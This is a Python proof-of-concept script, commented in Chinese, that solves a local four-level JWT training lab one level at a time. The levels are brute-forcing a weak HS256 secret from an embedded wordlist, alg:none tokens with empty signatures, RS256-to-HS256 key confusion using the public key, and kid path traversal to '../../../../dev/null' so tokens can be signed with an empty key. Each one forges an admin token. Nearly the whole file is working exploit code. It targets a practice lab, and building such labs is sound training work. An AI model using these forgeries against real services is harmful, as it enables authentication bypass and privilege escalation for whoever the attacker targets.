#!/usr/bin/env python3
"""
JWT 靶场一键验证（纯标准库，不依赖 requests / pyjwt）

跑之前先起靶场：
    ./setup.sh

然后：
    python3 poc/jwt_exp.py           # 四关全打
    python3 poc/jwt_exp.py 1 3       # 只打指定关卡
"""

import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time
from urllib.error import URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

BASE = os.environ.get("BASE", "http://127.0.0.1:8898").rstrip("/")

FLAG_RE = re.compile(r"FLAG\{[^}]*\}")

USERNAME = "alice"
PASSWORD = "alice123"

# L1 的爆破字典。真实打靶拿 rockyou 前 1000 行就行，这里内嵌一份最小的，
# 保证不装任何工具也能跑通。真正的 secret 藏在里面。
WORDS = [
    "secret", "123456", "password", "admin", "jwt", "changeme", "root", "test",
    "qwerty", "letmein", "welcome", "abc123", "secretkey", "key", "jwtsecret",
    "mykey", "token", "default", "pass", "1234", "12345", "111111", "iloveyou",
    "monkey", "dragon", "master", "sunshine", "princess", "football", "baseball",
    "shadow", "superman", "michael", "jennifer", "hunter", "trustno1", "passw0rd",
    "admin123", "test123", "demo", "dev", "lab", "local", "hello", "world",
    "s3cr3t", "mysecret", "supersecret", "jwt123", "notsosecret",
]


# ---------- Base64URL / 签名 ----------

def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64u_dec(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def hs256(signing_input: str, key: bytes) -> str:
    """HMAC-SHA256，返回 base64url 后的签名段。"""
    return b64u(hmac.new(key, signing_input.encode(), hashlib.sha256).digest())


def forge(header: dict, payload: dict, key: bytes) -> str:
    """用给定密钥签一个 HS256 令牌。header 原样用，不偷偷改成 HS256。"""
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{hs256(f'{h}.{p}', key)}"


def decode_payload(token: str) -> dict:
    return json.loads(b64u_dec(token.split(".")[1]))


# ---------- HTTP ----------

def http_get(path, token=None, timeout=15):
    req = Request(BASE + path)
    if token:
        req.add_header("Cookie", f"token={token}")
    with urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def http_post(path, data, timeout=15):
    body = urlencode(data).encode()
    req = Request(BASE + path, data=body,
                  headers={"Content-Type": "application/x-www-form-urlencoded"})
    with urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace"), r.headers.get_all("Set-Cookie") or []


def login(level_path):
    """登录 alice，返回服务端发的合法 token。"""
    _, cookies = http_post(level_path, {"username": USERNAME, "password": PASSWORD})
    for c in cookies:
        if c.startswith("token="):
            return c.split(";")[0].split("=", 1)[1]
    raise RuntimeError("登录后没拿到 token cookie")


def grab_flag(html):
    m = FLAG_RE.search(html or "")
    return m.group(0) if m else None


def admin_payload(token: str) -> dict:
    """拿合法 token 的 payload 当模板，只把 role 改掉 —— 尽量少动其他字段。"""
    p = decode_payload(token)
    p["role"] = "admin"
    p.setdefault("exp", int(time.time()) + 3600)
    return p


# ---------- 四关 ----------

def level1():
    tok = login("/l1.php")
    h, p, s = tok.split(".")

    # 爆破：对每个候选词算一次 HS256，和令牌里的签名比对
    secret = None
    for w in WORDS:
        if hmac.compare_digest(hs256(f"{h}.{p}", w.encode()), s):
            secret = w
            break
    if secret is None:
        return None, "字典里没有，换 rockyou 前 1000 行再试"

    forged = forge({"alg": "HS256", "typ": "JWT"}, admin_payload(tok), secret.encode())
    html = http_get("/l1.php", forged)
    return grab_flag(html), f"爆破出密钥 secret={secret!r}，自己签了 role=admin"


def level2():
    tok = login("/l2.php")
    payload = admin_payload(tok)

    # alg 改成 none，签名段留空。h.p. 和 h.p 服务端都接受（explode 后第 3 段为空）
    h = b64u(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    forged = f"{h}.{p}."

    html = http_get("/l2.php", forged)
    return grab_flag(html), "alg=none + 空签名，服务端跳过验签"


def level3():
    tok = login("/l3.php")
    payload = admin_payload(tok)

    # 关键一步：把「公开的公钥」当 HMAC 密钥。公钥本来就挂在这页让人下载。
    pub = http_get("/pub.pem").encode()
    forged = forge({"alg": "HS256", "typ": "JWT"}, payload, pub)

    html = http_get("/l3.php", forged)
    return grab_flag(html), f"RS256→HS256，HMAC 密钥用的是 {len(pub)} 字节的 pub.pem"


def level4():
    tok = login("/l4.php")
    payload = admin_payload(tok)

    # 容器里大概在 /var/www/html，keys/ 往上爬 4 层到 /，读 dev/null（空文件）
    kid = "../../../../dev/null"
    forged = forge({"alg": "HS256", "typ": "JWT", "kid": kid}, payload, b"")

    html = http_get("/l4.php", forged)
    return grab_flag(html), f"kid={kid} → 读到空文件 → 空密钥签名"


LEVELS = {
    1: ("L1 弱密钥", level1),
    2: ("L2 alg:none", level2),
    3: ("L3 算法混淆", level3),
    4: ("L4 kid 注入", level4),
}


def main():
    wanted = [int(a) for a in sys.argv[1:] if a.isdigit()] or sorted(LEVELS)

    print(f"目标：{BASE}\n")
    failed = []

    for n in wanted:
        name, fn = LEVELS[n]
        try:
            flag, note = fn()
        except URLError as e:
            print(f"  {name:<16} 连接失败 {e}")
            failed.append(n)
            continue
        except Exception as e:  # noqa: BLE001
            print(f"  {name:<16} 异常 {type(e).__name__}: {e}")
            failed.append(n)
            continue

        if flag:
            print(f"  {name:<16} OK   {flag}   ({note})")
        else:
            print(f"  {name:<16} 没拿到 flag（{note}）")
            failed.append(n)

    print()
    if failed:
        print("没通的关卡：" + ", ".join(f"L{i}" for i in failed))
        print("排查顺序：docker ps 看容器 → docker compose logs web → 浏览器手工点一遍看报错")
        sys.exit(1)
    print("四关全通。")


if __name__ == "__main__":
    main()
